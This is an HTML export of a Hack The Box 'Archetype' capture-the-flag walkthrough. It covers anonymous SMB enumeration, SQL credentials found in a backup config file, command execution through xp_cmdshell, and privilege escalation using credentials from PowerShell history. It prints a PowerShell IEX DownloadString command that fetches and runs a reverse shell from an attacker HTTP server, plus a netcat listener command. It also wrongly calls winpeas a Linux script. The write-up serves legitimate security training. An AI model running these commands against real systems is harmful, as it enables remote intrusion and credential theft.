<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=dB3GuSCq0f_LRNaO3opFPA');.lst-kix_lq4rxhk7n857-4>li:before{content:"\0025cb  "}.lst-kix_lq4rxhk7n857-3>li:before{content:"\0025cf  "}.lst-kix_lq4rxhk7n857-2>li:before{content:"\0025a0  "}.lst-kix_lq4rxhk7n857-1>li:before{content:"\0025cb  "}.lst-kix_lq4rxhk7n857-0>li:before{content:"\0025cf  "}ul.lst-kix_luuvkrofeaev-4{list-style-type:none}ul.lst-kix_luuvkrofeaev-5{list-style-type:none}ul.lst-kix_luuvkrofeaev-6{list-style-type:none}.lst-kix_luuvkrofeaev-2>li:before{content:"\0025a0  "}.lst-kix_luuvkrofeaev-4>li:before{content:"\0025cb  "}ul.lst-kix_luuvkrofeaev-7{list-style-type:none}ul.lst-kix_luuvkrofeaev-8{list-style-type:none}.lst-kix_luuvkrofeaev-1>li:before{content:"\0025cb  "}.lst-kix_luuvkrofeaev-5>li:before{content:"\0025a0  "}ul.lst-kix_luuvkrofeaev-0{list-style-type:none}ul.lst-kix_luuvkrofeaev-1{list-style-type:none}ul.lst-kix_luuvkrofeaev-2{list-style-type:none}.lst-kix_luuvkrofeaev-3>li:before{content:"\0025cf  "}ul.lst-kix_luuvkrofeaev-3{list-style-type:none}.lst-kix_luuvkrofeaev-7>li:before{content:"\0025cb  "}.lst-kix_luuvkrofeaev-6>li:before{content:"\0025cf  "}.lst-kix_luuvkrofeaev-8>li:before{content:"\0025a0  "}.lst-kix_bva6qah2ftmi-3>li:before{content:"\0025cf  "}.lst-kix_bva6qah2ftmi-4>li:before{content:"\0025cb  "}.lst-kix_bva6qah2ftmi-2>li:before{content:"\0025a0  "}.lst-kix_bva6qah2ftmi-6>li:before{content:"\0025cf  "}.lst-kix_bva6qah2ftmi-1>li:before{content:"\0025cb  "}.lst-kix_bva6qah2ftmi-5>li:before{content:"\0025a0  "}.lst-kix_bva6qah2ftmi-0>li:before{content:"\0025cf  "}.lst-kix_bva6qah2ftmi-8>li:before{content:"\0025a0  "}.lst-kix_bva6qah2ftmi-7>li:before{content:"\0025cb  "}.lst-kix_luuvkrofeaev-0>li:before{content:"\0025cf  "}ul.lst-kix_bva6qah2ftmi-0{list-style-type:none}ul.lst-kix_bva6qah2ftmi-1{list-style-type:none}ul.lst-kix_bva6qah2ftmi-2{list-style-type:none}ul.lst-kix_bva6qah2ftmi-3{list-style-type:none}ul.lst-kix_lq4rxhk7n857-4{list-style-type:none}ul.lst-kix_lq4rxhk7n857-5{list-style-type:none}ul.lst-kix_lq4rxhk7n857-2{list-style-type:none}ul.lst-kix_lq4rxhk7n857-3{list-style-type:none}ul.lst-kix_lq4rxhk7n857-0{list-style-type:none}ul.lst-kix_lq4rxhk7n857-1{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ul.lst-kix_lq4rxhk7n857-8{list-style-type:none}.lst-kix_lq4rxhk7n857-5>li:before{content:"\0025a0  "}ul.lst-kix_lq4rxhk7n857-6{list-style-type:none}ul.lst-kix_lq4rxhk7n857-7{list-style-type:none}ul.lst-kix_bva6qah2ftmi-4{list-style-type:none}.lst-kix_lq4rxhk7n857-6>li:before{content:"\0025cf  "}ul.lst-kix_bva6qah2ftmi-5{list-style-type:none}ul.lst-kix_bva6qah2ftmi-6{list-style-type:none}ul.lst-kix_bva6qah2ftmi-7{list-style-type:none}ul.lst-kix_bva6qah2ftmi-8{list-style-type:none}.lst-kix_lq4rxhk7n857-8>li:before{content:"\0025a0  "}.lst-kix_lq4rxhk7n857-7>li:before{content:"\0025cb  "}ol{margin:0;padding:0}table td,table th{padding:0}.c8{background-color:#000000;color:#f3f3f3;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c12{background-color:#000000;color:#f3f3f3;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:italic}.c3{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:24pt;font-family:"Arial";font-style:normal}.c4{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:15pt;font-family:"Arial";font-style:normal}.c21{padding-top:12pt;padding-bottom:12pt;line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:center}.c7{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.c1{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c22{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c16{background-color:#000000;-webkit-text-decoration-skip:none;color:#f3f3f3;text-decoration:underline;text-decoration-skip-ink:none;font-style:italic}.c13{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c0{padding-top:12pt;padding-bottom:12pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c6{padding-top:12pt;padding-bottom:12pt;line-height:1.3;orphans:2;widows:2;text-align:left}.c19{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#f3f3f3;text-decoration:underline}.c18{font-size:10.5pt;font-family:"Open Sans";color:#f3f3f3;font-weight:400}.c5{background-color:#ffffff;max-width:451.4pt;padding:72pt 72pt 72pt 72pt}.c20{font-style:italic;color:#f3f3f3}.c15{color:inherit;text-decoration:inherit}.c14{font-size:15pt;font-weight:700}.c2{margin-left:36pt;padding-left:0pt}.c10{padding:0;margin:0}.c11{color:#00ffff}.c17{background-color:#000000}.c23{color:#f3f3f3}.c9{height:11pt}.c24{page-break-after:avoid}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c5"><h1 class="c21" id="h.e4q49cdeifht"><span class="c3">Hack The Box Archetype</span></h1><p class="c0 c9"><span class="c1"></span></p><p class="c0"><span class="c4">Skill Required</span></p><ul class="c10 lst-kix_lq4rxhk7n857-0 start"><li class="c0 c2 li-bullet-0"><span>SMB </span><span class="c1">Enumeration</span></li><li class="c0 c2 li-bullet-0"><span class="c1">SQL syntax</span></li><li class="c0 c2 li-bullet-0"><span class="c1">Network listener configuration</span></li><li class="c0 c2 li-bullet-0"><span class="c1">Reverse shell deployment</span></li></ul><p class="c0"><span class="c14">Tools Used</span></p><ul class="c10 lst-kix_luuvkrofeaev-0 start"><li class="c0 c2 li-bullet-0"><span class="c1">Impacket mssqlclient</span></li><li class="c0 c2 li-bullet-0"><span class="c1">Impacket psexec</span></li><li class="c2 c6 li-bullet-0"><span class="c1">Python HTTP server</span></li><li class="c0 c2 li-bullet-0"><span class="c1">Reverse shell</span></li><li class="c0 c2 li-bullet-0"><span class="c1">Netcat</span></li></ul><h1 class="c0 c24" id="h.esb6cvybnlh7"><span class="c7">Lessons Learned</span></h1><p class="c0"><span class="c4">Recon</span></p><p class="c0"><span class="c1">We kick this lab off with the recon phase and perform a standard nmap scan this reveals several ports including the smb share and SQL port.</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 601.70px; height: 309.33px;"><img alt="" src="images/image1.png" style="width: 601.70px; height: 309.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0 c9"><span class="c4"></span></p><p class="c0"><span class="c4">SMB Enumeration</span></p><p class="c0"><span class="c1">From here we try listing the smb shares with &ldquo;smbclient -L 10.10.10.27&rdquo; and we are prompted for a password, and passing a blank password reveals anonymous access is allowed. We could automate this process with &ldquo;enum4linux&rdquo; if we wanted to use a little more automation</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 424.00px; height: 188.00px;"><img alt="" src="images/image6.png" style="width: 424.00px; height: 188.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>From here we see there is a backups folder and we connect with </span><span class="c11">&ldquo;smbclient //10.10.10.27/backups&rdquo; </span><span class="c1">and notice a &ldquo;prod.dtscConfig&rdquo; file that we download with the &ldquo;get&rdquo; command. We cat this file and find a username and password for an SQL service. Well we already </span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 601.70px; height: 218.67px;"><img alt="" src="images/image9.png" style="width: 601.70px; height: 218.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c4">MySql Connection</span></p><p class="c0"><span>From here we need to make our linux machine connect to a windows SQL server. There are several tools to help with this, and we will use impacket as it is native to linux.</span><span class="c4">&nbsp;</span></p><p class="c0"><span>We connect in with the following command.</span></p><p class="c0"><span class="c20 c17">python3</span><span class="c17 c20"><a class="c15" href="https://www.google.com/url?q=http://mssqlclient.py/&amp;sa=D&amp;source=editors&amp;ust=1620286991197000&amp;usg=AOvVaw2g7d5b9F-uLCjxeokZTSJU">&nbsp;</a></span><span class="c16"><a class="c15" href="https://www.google.com/url?q=http://mssqlclient.py/&amp;sa=D&amp;source=editors&amp;ust=1620286991197000&amp;usg=AOvVaw2g7d5b9F-uLCjxeokZTSJU">mssqlclient.py</a></span><span class="c20 c17">&nbsp;ARCHTYPE/sql_svc@10.10.10.27 -windows-auth</span></p><p class="c0 c9"><span class="c4"></span></p><p class="c0 c9"><span class="c4"></span></p><p class="c0"><span class="c4">Command Execution</span></p><p class="c0"><span class="c1">Now we have our initial foothold and with this the goal is to move horizontally and gain further access and permissions by exploiting the SQL server to move horizontally. So the first thing we check for is command execution using the following. </span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 601.70px; height: 149.33px;"><img alt="" src="images/image3.png" style="width: 601.70px; height: 149.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c1">Great, we have command execution. Our next step will be generating and executing a reverse shell to gain host access and escape the SQL shell for something with more privilege and access. </span></p><p class="c0"><span class="c4">Pop a Shell</span></p><p class="c0"><span class="c1">Here how this is going to look:</span></p><ul class="c10 lst-kix_bva6qah2ftmi-0 start"><li class="c0 c2 li-bullet-0"><span class="c1">Setup a simple python server to serve up our malware/reverse shell</span></li><li class="c0 c2 li-bullet-0"><span class="c1">Set Up a netcat listener to catch our reverse shell</span></li><li class="c0 c2 li-bullet-0"><span class="c1">From the SQL server, we execute a command to download our file/malware and execute from memory as a string.</span></li></ul><p class="c0"><span class="c1">I initially tried a few reverse shells without any luck, and spun my wheels for a few hours retracing my steps and methodologies. But the below shell was finally successful. </span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 601.70px; height: 217.33px;"><img alt="" src="images/image5.png" style="width: 601.70px; height: 217.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c1">Create a Reverse shell script. We named ours &ldquo;shell.ps1&rdquo;. Serve this file to the server by spinning up a python HTTP server in the same directory as your file.</span></p><p class="c0 c9"><span class="c1"></span></p><p class="c0"><span class="c1">Spin up a listener on the same port as defined in your reverse shell.</span></p><p class="c0"><span class="c8">&ldquo;Nc -nlvp 6363&rdquo;</span></p><p class="c0"><span class="c1">Then execute the following command from the SQL shell to download the file from your file server, and execute a shell back to your listener.</span></p><p class="c0"><span class="c17 c23">SQL&gt; xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\&quot;</span><span class="c17 c19"><a class="c15" href="https://www.google.com/url?q=http://10.10.17.115:8000/shell.ps1%255C%255C%255C%255C%2522);%2522&amp;sa=D&amp;source=editors&amp;ust=1620286991199000&amp;usg=AOvVaw0xb5zlwfJOG95_Q5lvDBAP">http://10.10.17.115:8000/shell.ps1&quot;)&quot;</a></span><span class="c8">);</span></p><p class="c0"><span class="c1">We see the Get request come through to our file server</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 601.70px; height: 64.00px;"><img alt="" src="images/image8.png" style="width: 601.70px; height: 64.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c1">We see the reverse shell callback to our netcat listener.</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 467.00px; height: 111.00px;"><img alt="" src="images/image7.png" style="width: 467.00px; height: 111.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c1">Form here we cap the user flag.</span></p><p class="c0"><span class="c4">Root</span></p><p class="c0"><span>From here we upload winpeas, a linux enumeration script that helps automate the process of finding privilege escalation paths. It highlights the path </span><span class="c17 c18">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span></p><p class="c0"><span class="c1">So we immediately browse to this file location and cat the contents. This is a common place to look, as administrators often pass credentials over powershell. Sure enough we find credentials after opening the file with the command &ldquo;type&rdquo;.</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 646.84px; height: 54.80px;"><img alt="" src="images/image4.png" style="width: 646.84px; height: 54.80px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c1">The last bit is just to connect back as an Administrator using psexec.py from the impacket suit. I used the following command </span></p><p class="c0"><span class="c8">&ldquo;python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27</span></p><p class="c0"><span class="c1">This provides a successful connection and we cat the root flag.</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 491.00px; height: 94.00px;"><img alt="" src="images/image2.png" style="width: 491.00px; height: 94.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0 c9"><span class="c1"></span></p><p class="c9 c13"><span class="c1"></span></p></body></html>